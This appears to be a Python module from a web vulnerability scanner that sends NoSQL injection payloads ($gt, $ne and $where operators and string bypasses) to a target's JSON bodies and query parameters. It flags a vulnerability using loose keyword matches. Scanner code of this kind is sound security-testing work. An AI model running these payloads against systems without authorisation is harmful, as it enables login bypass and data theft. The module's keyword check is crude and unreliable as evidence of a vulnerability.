from awap.engines.attack.base import AttackModule
import json

class NoSQLInjectionModule(AttackModule):
    """
    NoSQL Injection Module.
    Specifically targeting MongoDB, CouchDB, etc., via JSON body or query param bypasses.
    """
    PAYLOADS = [
        {"$gt": ""},
        {"$ne": None},
        {"$where": "true"},
        "admin' || '1'=='1",
        "'; return true; var dummy='",
    ]

    async def run(self, url: str, params: list[dict]) -> list[dict]:
        findings = []
        for param in params:
            for payload in self.PAYLOADS:
                # Test as JSON if method is POST/PUT
                try:
                    # Case 1: JSON body injection (Most common)
                    if param['type'] == 'body':
                        # We send the payload as a raw object inside JSON
                        resp = await self.client.post(url, json={param['name']: payload})
                        if self._is_nosql_vulnerable(resp):
                            findings.append({
                                'vuln_class': 'NOSQL_INJECTION',
                                'url': url, 'param': param['name'],
                                'payload': json.dumps(payload),
                                'evidence': "Response suggests database logic bypass ($gt/$ne operator accepted)",
                                'severity': 'CRITICAL', 'cvss': 9.8,
                                'request_raw': str(resp.request.read()),
                                'response_raw': resp.text[:500]
                            })
                            break
                    
                    # Case 2: Query param injection (e.g. ?user[$ne]=null)
                    # We have to manually construct the brackets for PHP/Express backends
                    query_payload = f"{param['name']}[$ne]=null"
                    test_url = f"{url}?{query_payload}"
                    resp = await self.client.get(test_url)
                    if self._is_nosql_vulnerable(resp):
                        findings.append({
                            'vuln_class': 'NOSQL_INJECTION',
                            'url': url, 'param': param['name'],
                            'payload': query_payload,
                            'evidence': "Query string operator bypass successful",
                            'severity': 'HIGH', 'cvss': 8.5,
                            'request_raw': test_url,
                            'response_raw': resp.text[:500]
                        })
                        break
                except Exception:
                    pass
        return findings

    def _is_nosql_vulnerable(self, resp) -> bool:
        # Check for error traces or unauthorized data inclusion
        lower_body = resp.text.lower()
        indicators = [
            "mongodb", "bson", "nosql", "query failed",
            "access granted", "welcome admin", "id: 1", "admin"
        ]
        if resp.status_code in [200, 500] and any(i in lower_body for i in indicators):
            return True
        return False
